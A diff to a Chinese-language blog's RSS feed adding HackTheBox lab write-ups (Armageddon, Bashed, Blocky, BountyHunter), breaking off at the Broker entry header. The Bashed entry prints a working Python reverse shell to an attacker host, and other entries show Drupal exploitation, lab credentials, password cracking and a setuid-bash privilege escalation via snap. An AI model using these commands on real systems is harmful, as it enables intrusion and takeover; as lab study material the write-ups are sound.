@@ -7,6 +7,3062 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Example Person</copyright><atom:link href="https://example.com/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Armageddon</title>
+        <link>https://example.com/htb/armageddon/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/armageddon/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫端口正常，无域名，扫目录&lt;/p&gt;
+&lt;p&gt;一个CHANGELOGO路径下的文件显示了是一个是Drupal 7.56的版本&lt;/p&gt;
+&lt;p&gt;存在CVE-2018-7600,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/armageddon/1727072841921-692f3b27-8867-40ff-83b3-372d641a492d.png&#34;
+	width=&#34;1140&#34;
+	height=&#34;593&#34;
+	srcset=&#34;https://example.com/htb/armageddon/1727072841921-692f3b27-8867-40ff-83b3-372d641a492d_huce1c7182ee5c9a981b8b6dcd0855f196_211486_480x0_resize_box_3.png 480w, https://example.com/htb/armageddon/1727072841921-692f3b27-8867-40ff-83b3-372d641a492d_huce1c7182ee5c9a981b8b6dcd0855f196_211486_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;192&#34;
+		data-flex-basis=&#34;461px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;不知道为啥自己写的反shell php用不了，用&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(242, 242, 242);&#34;&gt;searchsploit的却可以&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;（写脚本转成base64过限制）&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;用kali自带的拿到个假shell&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;然后了解&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;Drupal 7.56的配置文件在&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sites/default/settings.php 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;后查看到数据库的用户密码&lt;/p&gt;
+&lt;p&gt;数据库连接失败（猜测为假shell不是本地，所以没有权限连接）&lt;/p&gt;
+&lt;p&gt;&amp;lsquo;database&amp;rsquo; =&amp;gt; &amp;lsquo;drupal&amp;rsquo;,&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;  &#39;username&#39; =&amp;gt; &#39;drupaluser&#39;,
+
+  &#39;password&#39; =&amp;gt; &#39;CQHEy@9M*m23gBVj&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql -u drupaluser -pCQHEy@9M*m23gBVj -e &amp;#39;show databases;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://example.com/htb/armageddon/1727073077637-d556c225-d369-4d07-a391-cb61992f95c0.png&#34;
+	width=&#34;989&#34;
+	height=&#34;464&#34;
+	srcset=&#34;https://example.com/htb/armageddon/1727073077637-d556c225-d369-4d07-a391-cb61992f95c0_hu403aa29b76bbaa20c693fd0baddbb3e9_65267_480x0_resize_box_3.png 480w, https://example.com/htb/armageddon/1727073077637-d556c225-d369-4d07-a391-cb61992f95c0_hu403aa29b76bbaa20c693fd0baddbb3e9_65267_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;213&#34;
+		data-flex-basis=&#34;511px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;后面能看到user表&lt;/p&gt;
+&lt;p&gt;里面存在一个用户和密码，hashcat解码拿到密码为booboo&lt;/p&gt;
+&lt;p&gt;ssh连接成功&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;sudo -l查看可root权限文件&lt;/p&gt;
+&lt;p&gt;sudo /usr/bin/snap install *&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/snap/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;折 | 走开Bins (gtfobins.github.io)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;查看用法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/armageddon/1727077434008-1b9ff61f-0c8c-49f8-9f6c-f51a5d85fffd.png&#34;
+	width=&#34;971&#34;
+	height=&#34;406&#34;
+	srcset=&#34;https://example.com/htb/armageddon/1727077434008-1b9ff61f-0c8c-49f8-9f6c-f51a5d85fffd_hu1c53794711918d1074e9782ed18456bb_10954_480x0_resize_box_3.png 480w, https://example.com/htb/armageddon/1727077434008-1b9ff61f-0c8c-49f8-9f6c-f51a5d85fffd_hu1c53794711918d1074e9782ed18456bb_10954_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;239&#34;
+		data-flex-basis=&#34;573px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用前先安装fpm&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;sudo gem install fpm&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;COMMAND=id
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将id替换成更改权限的命令（ssh）&lt;/p&gt;
+&lt;p&gt;这里使用bash文件&lt;/p&gt;
+&lt;p&gt;在靶机中的bash文件复制到用户主目录下（这里不直接更改bash是bash上存在了关联一堆的包，复制出来使用单独的bash文件）&lt;/p&gt;
+&lt;p&gt;cp /usr/bin/bash ~/bash&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;COMMAND=&amp;ldquo;chown root:root /home/brucetherealadmin/bash;chmod 4755 /home/brucetherealadmin/bash&amp;rdquo;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/armageddon/1727077613561-80667dd0-2e3f-4d27-bb86-7a7d01fa2c12.png&#34;
+	width=&#34;934&#34;
+	height=&#34;711&#34;
+	srcset=&#34;https://example.com/htb/armageddon/1727077613561-80667dd0-2e3f-4d27-bb86-7a7d01fa2c12_hu84d62b0b8a180a0066b8d2d43df1f182_78554_480x0_resize_box_3.png 480w, https://example.com/htb/armageddon/1727077613561-80667dd0-2e3f-4d27-bb86-7a7d01fa2c12_hu84d62b0b8a180a0066b8d2d43df1f182_78554_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;131&#34;
+		data-flex-basis=&#34;315px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;根据gowayby的命令生成了一个snap文件&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;上传到靶机上&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;执行&lt;/p&gt;
+&lt;p&gt;&amp;ndash;dangerous &amp;ndash;devmode 意思是打开危险模式和开发者模式&lt;/p&gt;
+&lt;p&gt;然后等待执行&lt;/p&gt;
+&lt;p&gt;可以看到用户目录下的bash文件所有者权限是root了&lt;/p&gt;
+&lt;p&gt;然后./bash -p 启动bash文件&lt;/p&gt;
+&lt;p&gt;-p是启动特权者模式，以./bash文件的权限执行&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Bashed</title>
+        <link>https://example.com/htb/bashed/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/bashed/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;nmap扫描端口，只有一个80&lt;/p&gt;
+&lt;p&gt;打开网页dirsearch扫下目录，dev路径下有伪shell&lt;/p&gt;
+&lt;p&gt;尝试反向shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.16.29&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;拿到www-data身份的shell&lt;/p&gt;
+&lt;h1 id=&#34;提权&#34;&gt;提权
+&lt;/h1&gt;&lt;h2 id=&#34;www-data-scriptmanager&#34;&gt;www-data-&amp;gt;scriptmanager
+&lt;/h2&gt;&lt;p&gt;查看www-data身份所有的权限&lt;/p&gt;
+&lt;p&gt;sudo -l&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bashed/1724160143451-63957701-104e-46d9-b514-0b53b038ef29.png&#34;
+	width=&#34;1648&#34;
+	height=&#34;816&#34;
+	srcset=&#34;https://example.com/htb/bashed/1724160143451-63957701-104e-46d9-b514-0b53b038ef29_hu3542b9b00dfeed2748f4d526baf1e9a9_118354_480x0_resize_box_3.png 480w, https://example.com/htb/bashed/1724160143451-63957701-104e-46d9-b514-0b53b038ef29_hu3542b9b00dfeed2748f4d526baf1e9a9_118354_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;201&#34;
+		data-flex-basis=&#34;484px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;得知能无密码使用scriptmanager的身份，先转到scriptmanager身份查看有无root运行权限的文件或信息&lt;/p&gt;
+&lt;p&gt;sudo -u scriptmanager /bin/bash&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bashed/1724160359818-b11af304-7609-4439-83cc-9cbf311447f1.png&#34;
+	width=&#34;1053&#34;
+	height=&#34;408&#34;
+	srcset=&#34;https://example.com/htb/bashed/1724160359818-b11af304-7609-4439-83cc-9cbf311447f1_huaebfff33fba32870a64fb0cfb767456c_49425_480x0_resize_box_3.png 480w, https://example.com/htb/bashed/1724160359818-b11af304-7609-4439-83cc-9cbf311447f1_huaebfff33fba32870a64fb0cfb767456c_49425_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;258&#34;
+		data-flex-basis=&#34;619px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;scriptmanager-root&#34;&gt;scriptmanager-&amp;gt;root
+&lt;/h2&gt;&lt;p&gt;sudo -l 得不到信息&lt;/p&gt;
+&lt;p&gt;ls -la查看权限信息&lt;/p&gt;
+&lt;p&gt;在scripts文件夹中看到俩个文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bashed/1724160642665-2383c887-e1b4-4eaf-9b71-a7789b2f6108.png&#34;
+	width=&#34;1216&#34;
+	height=&#34;349&#34;
+	srcset=&#34;https://example.com/htb/bashed/1724160642665-2383c887-e1b4-4eaf-9b71-a7789b2f6108_hubfc63e4efabc33201ccbbc652177ac5a_48924_480x0_resize_box_3.png 480w, https://example.com/htb/bashed/1724160642665-2383c887-e1b4-4eaf-9b71-a7789b2f6108_hubfc63e4efabc33201ccbbc652177ac5a_48924_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;348&#34;
+		data-flex-basis=&#34;836px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:#000000;&#34;&gt;由于 test.txt 由 root 拥有，这意味着脚本 test.py 应由 root 运行。用户 scriptmanager 拥有 test.py 文件，这意味着我可以更改该文件，并将以 root 身份运行&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:#000000;&#34;&gt;为了方便编辑test.py前升级一下交互shell&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(242, 242, 242);&#34;&gt;python3 -c &amp;lsquo;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo;&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;发现依然不好编辑test.py文件，换一个想法，我们本地编辑一个可以获得shell的test.py文件去替代&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import socket,subprocess,os;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;s.connect((&amp;#34;10.10.16.29&amp;#34;,8888));os.dup2(s.fileno(),0);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;os.dup2(s.fileno(),1);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;os.dup2(s.fileno(),2);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;test.py会每隔一分钟自动执行一次，只需等待系统以root身份去执行文件，然后拿到shell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bashed/1724162428185-c76aee23-f131-4f78-ad53-7513be61f837.png&#34;
+	width=&#34;1126&#34;
+	height=&#34;507&#34;
+	srcset=&#34;https://example.com/htb/bashed/1724162428185-c76aee23-f131-4f78-ad53-7513be61f837_hudb2e02af2432f172aba8ec7a6f296b35_128993_480x0_resize_box_3.png 480w, https://example.com/htb/bashed/1724162428185-c76aee23-f131-4f78-ad53-7513be61f837_hudb2e02af2432f172aba8ec7a6f296b35_128993_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;222&#34;
+		data-flex-basis=&#34;533px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Blocky</title>
+        <link>https://example.com/htb/blocky/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/blocky/</guid>
+        <description>&lt;p&gt;端口扫描，有域名子域名爆破，目录扫描&lt;/p&gt;
+&lt;p&gt;在&lt;/p&gt;
+&lt;p&gt;/plugins&lt;/p&gt;
+&lt;p&gt;目录下发现俩个Jar包，解码一个包拿到一个密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/blocky/1726990523960-2bec2d9f-4763-49b6-bcfb-06cfff12f79b.png&#34;
+	width=&#34;1548&#34;
+	height=&#34;840&#34;
+	srcset=&#34;https://example.com/htb/blocky/1726990523960-2bec2d9f-4763-49b6-bcfb-06cfff12f79b_hudaec54c4f28652abb0392ac476998089_116378_480x0_resize_box_3.png 480w, https://example.com/htb/blocky/1726990523960-2bec2d9f-4763-49b6-bcfb-06cfff12f79b_hudaec54c4f28652abb0392ac476998089_116378_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;184&#34;
+		data-flex-basis=&#34;442px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;wpsacn 扫描用户&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/blocky/1726990559726-f8bee47f-18f5-4448-9795-5174c978c4a2.png&#34;
+	width=&#34;1266&#34;
+	height=&#34;466&#34;
+	srcset=&#34;https://example.com/htb/blocky/1726990559726-f8bee47f-18f5-4448-9795-5174c978c4a2_hu7d452468a95c96efa7c36ce0f519c15a_75962_480x0_resize_box_3.png 480w, https://example.com/htb/blocky/1726990559726-f8bee47f-18f5-4448-9795-5174c978c4a2_hu7d452468a95c96efa7c36ce0f519c15a_75962_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;271&#34;
+		data-flex-basis=&#34;652px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;ssh登录&lt;/p&gt;
+&lt;p&gt;成功&lt;/p&gt;
+&lt;p&gt;sudo -l查看权限文件&lt;/p&gt;
+&lt;p&gt;发现全局都行&lt;/p&gt;
+&lt;p&gt;直接sudo su&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>BountyHunter</title>
+        <link>https://example.com/htb/bountyhunter/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/bountyhunter/</guid>
+        <description>&lt;p&gt;扫描端口正常网页打开找到一个输入的点&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bountyhunter/1726388076210-f9409615-3cb8-4492-b8a1-349b230b3937.png&#34;
+	width=&#34;1149&#34;
+	height=&#34;674&#34;
+	srcset=&#34;https://example.com/htb/bountyhunter/1726388076210-f9409615-3cb8-4492-b8a1-349b230b3937_hucee3325f09c7e1589d1bf35b65375cd4_128883_480x0_resize_box_3.png 480w, https://example.com/htb/bountyhunter/1726388076210-f9409615-3cb8-4492-b8a1-349b230b3937_hucee3325f09c7e1589d1bf35b65375cd4_128883_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;170&#34;
+		data-flex-basis=&#34;409px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;抓包查看输入的值会被编码64，解析为xml&lt;/p&gt;
+&lt;p&gt;想起为xml实体攻击查看文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bountyhunter/1726389710400-3414f00b-ed6c-400e-a9b4-cd17e1a6095a.png&#34;
+	width=&#34;976&#34;
+	height=&#34;612&#34;
+	srcset=&#34;https://example.com/htb/bountyhunter/1726389710400-3414f00b-ed6c-400e-a9b4-cd17e1a6095a_hu4bffcd76de629b6d8e6096cf09c93ed9_78832_480x0_resize_box_3.png 480w, https://example.com/htb/bountyhunter/1726389710400-3414f00b-ed6c-400e-a9b4-cd17e1a6095a_hu4bffcd76de629b6d8e6096cf09c93ed9_78832_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;159&#34;
+		data-flex-basis=&#34;382px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;根据之前目录扫到的db.php文件，查看当前文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bountyhunter/1726389776182-a9aae19e-ee7a-453d-9187-c10233b37cc2.png&#34;
+	width=&#34;1556&#34;
+	height=&#34;715&#34;
+	srcset=&#34;https://example.com/htb/bountyhunter/1726389776182-a9aae19e-ee7a-453d-9187-c10233b37cc2_huaca2fbab0d7b73ab10017a1edadaa190_159688_480x0_resize_box_3.png 480w, https://example.com/htb/bountyhunter/1726389776182-a9aae19e-ee7a-453d-9187-c10233b37cc2_huaca2fbab0d7b73ab10017a1edadaa190_159688_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;217&#34;
+		data-flex-basis=&#34;522px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;拿到网站管理员的密码&lt;/p&gt;
+&lt;p&gt;m19RoAU0hP41A1sTsq6K&lt;/p&gt;
+&lt;p&gt;之后探测用户名，探测/etc/passwd文件，查看用户目录在home下的用户&lt;/p&gt;
+&lt;p&gt;ssh登录&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;sudo -l查看root权限&lt;/p&gt;
+&lt;p&gt;发现能够root执行一个py文件&lt;/p&gt;
+&lt;p&gt;阅读文件构造plyload&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bountyhunter/1726392531500-5dffe145-e7d6-4538-a83f-58ece7a6c171.png&#34;
+	width=&#34;767&#34;
+	height=&#34;415&#34;
+	srcset=&#34;https://example.com/htb/bountyhunter/1726392531500-5dffe145-e7d6-4538-a83f-58ece7a6c171_hue6c5c0047e6510db90eb6b2406af258e_42551_480x0_resize_box_3.png 480w, https://example.com/htb/bountyhunter/1726392531500-5dffe145-e7d6-4538-a83f-58ece7a6c171_hue6c5c0047e6510db90eb6b2406af258e_42551_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;184&#34;
+		data-flex-basis=&#34;443px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/bountyhunter/1726392552142-62cdc277-6c79-4636-88a0-98a31e5996d5.png&#34;
+	width=&#34;928&#34;
+	height=&#34;691&#34;
+	srcset=&#34;https://example.com/htb/bountyhunter/1726392552142-62cdc277-6c79-4636-88a0-98a31e5996d5_hu333e9fc4bc49cd1eacfafac7bf5caad4_64582_480x0_resize_box_3.png 480w, https://example.com/htb/bountyhunter/1726392552142-62cdc277-6c79-4636-88a0-98a31e5996d5_hu333e9fc4bc49cd1eacfafac7bf5caad4_64582_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;134&#34;
+		data-flex-basis=&#34;322px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;eval函数中有另一个eval,将执行eval函数&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Broker（未完）</title>
+        <link>https://example.com/htb/broker%E6%9C%AA%E5%AE%8C/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
